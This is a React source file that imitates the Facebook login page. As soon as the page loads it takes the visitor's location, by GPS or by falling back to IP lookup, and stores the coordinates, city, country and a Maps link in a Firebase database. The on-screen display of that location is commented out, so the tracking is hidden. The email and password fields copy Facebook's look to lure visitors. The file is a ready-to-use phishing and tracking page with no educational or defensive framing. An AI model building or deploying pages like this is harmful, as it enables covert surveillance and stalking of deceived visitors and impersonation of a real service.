import React, { useEffect, useState } from "react";
import { database } from "./firebase";
import { ref, push } from "firebase/database";

function App() {
  const [location, setLocation] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    requestLocation();
  }, []);

  // 📌 Function to request location (GPS first, fallback to IP)
  const requestLocation = () => {
    console.log("📌 Checking location permission...");
    checkPermissionAndFetchLocation();
  };

  // 📌 Check and Request Permission for GPS
  const checkPermissionAndFetchLocation = async () => {
    if ("permissions" in navigator) {
      try {
        const permission = await navigator.permissions.query({ name: "geolocation" });
  
        if (permission.state === "granted") {
          console.log("✅ Location permission granted");
          getGPSLocation();
        } else if (permission.state === "prompt") {
          console.log("🔔 Asking user for permission...");
          getGPSLocation();
        } else {
          console.warn("❌ Permission denied. Asking user to enable it...");
          alert(
            "Location access is blocked. Please enable it in your browser settings."
          );
        }
      } catch (err) {
        console.warn("⚠️ Permission API failed, trying GPS...", err);
        getGPSLocation();
      }
    } else {
      console.warn("⚠️ Permission API not supported, trying GPS...");
      getGPSLocation();
    }
  };
  

  // 📌 Get Location Using GPS
  const getGPSLocation = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude } = position.coords;
          saveLocation(latitude, longitude, "GPS");
        },
        async (error) => {
          console.warn("❌ GPS failed, trying IP-based location...", error);
          if (error.code === error.PERMISSION_DENIED) {
            alert("Please allow location access in your browser settings.");
          }
          getIPLocation(); // Fallback to IP
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } else {
      console.error("❌ Geolocation not supported");
      alert("Your browser does not support location services.");
    }
  };
  

  // 📌 Get Location Using IP (Fallback)
  const getIPLocation = async () => {
    try {
      const response = await fetch("https://ip-api.com/json");
      const data = await response.json();
      saveLocation(data.lat, data.lon, "IP-based", data.city, data.country);
    } catch (err) {
      console.error("❌ IP Geolocation failed:", err);
    }
  };

  // 📌 Function to Store Location in Firebase
  const saveLocation = async (latitude, longitude, method, city = "", country = "") => {
    const locationData = {
      latitude,
      longitude,
      method, // GPS or IP-based
      city,
      country,
      timestamp: new Date().toISOString(),
      mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`, // Google Maps link
    };

    setLocation(locationData);
    setLoading(false);

    // Store in Firebase Realtime Database
    const locationRef = ref(database, "userLocations");
    await push(locationRef, locationData);
  };

  return (
    <div
      style={{
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        height: "100vh",
        backgroundColor: "#f0f2f5",
        fontFamily: "Arial, sans-serif",
      }}
    >
      <div
        style={{
          textAlign: "center",
          width: "90%",
          maxWidth: "400px",
          backgroundColor: "white",
          padding: "20px",
          borderRadius: "8px",
          boxShadow: "0px 4px 10px rgba(0,0,0,0.1)",
        }}
      >
        <h1 style={{ color: "#1877f2", fontSize: "32px", fontWeight: "bold" }}>
          facebook
        </h1>
        <p style={{ color: "#606770", fontSize: "16px" }}>
          Connect with friends and the world around you on Facebook.
        </p>

        {/* Login Form */}
        <input
          type="text"
          placeholder="Email or phone number"
          style={{
            width: "100%",
            padding: "12px",
            margin: "10px 0",
            borderRadius: "6px",
            border: "1px solid #ddd",
            fontSize: "16px",
          }}
        />
        <input
          type="password"
          placeholder="Password"
          style={{
            width: "100%",
            padding: "12px",
            margin: "10px 0",
            borderRadius: "6px",
            border: "1px solid #ddd",
            fontSize: "16px",
          }}
        />
        <button
          style={{
            width: "100%",
            padding: "12px",
            backgroundColor: "#1877f2",
            color: "white",
            fontSize: "16px",
            fontWeight: "bold",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
            marginTop: "10px",
          }}
        >
          Log In
        </button>
        <p
          style={{
            color: "#1877f2",
            fontSize: "14px",
            marginTop: "10px",
            cursor: "pointer",
          }}
        >
          Forgot password?
        </p>
        <hr style={{ margin: "20px 0", border: "0.5px solid #ddd" }} />
        <button
          style={{
            width: "100%",
            padding: "12px",
            backgroundColor: "#42b72a",
            color: "white",
            fontSize: "16px",
            fontWeight: "bold",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
          }}
        >
          Create New Account
        </button>

        {/* Location Information */}
        {/* <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
          {loading ? (
            <p>Fetching location...</p>
          ) : location ? (
            <div>
              <p>Latitude: {location.latitude}</p>
              <p>Longitude: {location.longitude}</p>
              {location.city && <p>City: {location.city}</p>}
              {location.country && <p>Country: {location.country}</p>}
              <p>Method: {location.method}</p>
              <a
                href={location.mapLink}
                target="_blank"
                rel="noopener noreferrer"
                style={{ color: "#1877f2", textDecoration: "none", fontWeight: "bold" }}
              >
                View on Google Maps
              </a>
            </div>
          ) : (
            <p>Could not retrieve location</p>
          )}
        </div> */}
      </div>
    </div>
  );
}

export default App;
